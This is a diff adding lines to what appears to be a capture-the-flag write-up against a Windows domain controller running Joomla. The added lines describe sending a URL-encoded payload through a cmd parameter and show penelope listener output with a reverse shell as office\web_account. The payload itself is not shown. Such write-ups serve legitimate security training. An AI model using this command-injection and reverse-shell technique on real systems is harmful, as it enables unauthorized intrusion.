@@ -504,4 +504,19 @@ Ill start a listener
 
 ![](Pasted%20image%2020260512195433.png)
 
-Now ill place the payload in the cmd parameter and URL encode the fiull
+Now ill place the payload in the cmd parameter and URL encode the full payload then send it!
+
+```python
+penelope -p 443                                         
+[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => DC 10.129.32.165 Microsoft_Windows_Server_2022_Standard-x64-based_PC 👤 office\web_account 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC~10.129.32.165-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2026_05_12-19_53_30-096.log
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+PS C:\xampp\htdocs\joomla>
+```
+I now have a reverse shell as this user!
+
+
